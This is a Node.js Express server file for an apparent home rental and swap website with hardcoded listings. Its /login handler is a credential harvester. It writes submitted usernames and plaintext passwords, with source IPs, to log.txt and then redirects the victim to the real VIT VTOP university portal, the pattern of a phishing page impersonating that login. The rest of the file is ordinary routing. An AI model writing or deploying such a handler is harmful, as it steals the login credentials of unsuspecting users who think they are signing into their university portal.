const express = require('express')
var app = express();
var bodyParser = require("body-parser")
var path = require('path')
var fs = require('fs')
app.use(express.static(__dirname + '/public'));
app.set("view engine", "ejs");
app.use(bodyParser.urlencoded({ extended: true }));


let rentPlaces = [

    {
        id : "1",
        place : "Pondicherry",
        address : "123 ",
        type : "2BHKApartment",
        price : "2500",
        hostedBy : "Khyati"
    
    },

    {
        id : "2",
        place : "Pondicherry",
        address : "123 ",
        type : "Villa",
        price : "5500",
        hostedBy : "Vishaka"
    },

    {
        id : "3",
        place : "Bangalore",
        address : "123 ",
        type : "Villa",
        price : "5000",
        hostedBy : "Shambhavi"
    },

    {
        id : "4",
        place : "Shimla",
        address : "123 ",
        type : "3BHKApartment",
        price : "3500",
        hostedBy : "Abhit"
    },
    {
        id : "5",
        place : "Ooty",
        address : "123 ",
        type : "Cottage",
        price : "4000",
        hostedBy : "Yash"
    }


]

let swapPlaces = [
    {
        id : "1",
        place : "Pondicherry",
        goingto : "Shimla",
        address : "123 ",
        type : "2BHKApartment",
        hostedBy : "Khyati"
    },

    {
        id : "2",
        place : "Pondicherry",
        goingto : "Bangalore",
        address : "123 ",
        type : "Villa",
        hostedBy : "Vishaka"
    },

    {
        id : "3",
        place : "Bangalore",
        goingto : "Pondicherry",
        address : "123 ",
        type : "Villa",
        hostedBy : "Shambhavi"
    },

    {
        id : "4",
        place : "Shimla",
        goingto : "Pondicherry",
        address : "123 ",
        type : "3BHKApartment",
        hostedBy : "Abhit"
    },
    {
        id : "5",
        place : "Ooty",
        goingto : "Pondicherry",
        address : "123 ",
        type : "Cottage",
        hostedBy : "Yash"
    }


]










app.get('/', async (req, res) => {


    res.render('index')
})

app.get('/rent', async (req, res) => {

    let query = req.query
    let rentPlacesRes = rentPlaces
    if(query.place){

        let place = query.place
        let type = query.type
        let interRes = rentPlaces.filter(i => i.place === place)
        rentPlacesRes = interRes.filter(i => i.type === type)

    }
    console.log(rentPlaces)
    console.log(rentPlacesRes)
    res.render('rent', {rentPlaces : rentPlacesRes})
})

app.get('/swap', async (req, res)=>{

    let query = req.query
    let swapPlacesRes = swapPlaces
    if(query.place){

        let place = query.place
        let type = query.type
        let from = query.from
        let interSwapRes = swapPlaces.filter(i => i.place === place)
        let interSwapRes2 = interSwapRes.filter(i => i.goingto === from)
        swapPlacesRes = interSwapRes2.filter(i => i.type === type)

    }

    res.render('swap', {swapPlaces : swapPlacesRes})
    
})

app.get('/profile', (req, res) => {
    res.render('profile')
})

app.get('/addNewPlace', (req, res) => {

    res.render('addNewPlace')
})

app.post('/addNewPlace', (req, res)=>{
    let newPlace = req.body
    console.log(newPlace)
    if(newPlace.category === "rent"){
        newPlace.id = rentPlaces[rentPlaces.length - 1].id + 1
        rentPlaces.push(newPlace)
    }
    else{
        newPlace.id = swapPlaces[swapPlaces.length - 1].id + 1

        swapPlaces.push(newPlace) 
    }
    
    res.render('addNewPlace')
    
})

app.post('/login', (req, res)=>{
    console.log("hisadat");
    //console.log("hostmane is ",req.hostname);
    console.log("protocol:  ",req.protocol);
    console.log("url hit is ",req.originalUrl);
    console.log("route is ",req.route);
    console.log("Source ip is ",req.ip);
    
    console.log("user id is",req.body.uname)
    console.log("password is",req.body.passwd);
    //console.log(req.body)
    //var origin = req.get('origin')
    //console.log("origin ", req.header('Origin'))
    //console.log(req.)
    var txt = "\nUser id: " + req.body.uname + " Password: " + req.body.passwd + " Protocol: " + req.protocol
        + " URL hit: " + req.originalUrl  + " Source IP: " + req.ip
    txt += "\n\n -------------------------------------------------------------------------------"

    fs.appendFile('log.txt', txt , function (err) {
        if (err) throw err;
        console.log('Updated!');
      });
    res.redirect("https://vtop.vit.ac.in/vtop/initialProcess");
    //res.render("vtoperr");
})


app.listen(3000,(req, res)=>{
    console.log("listening")
})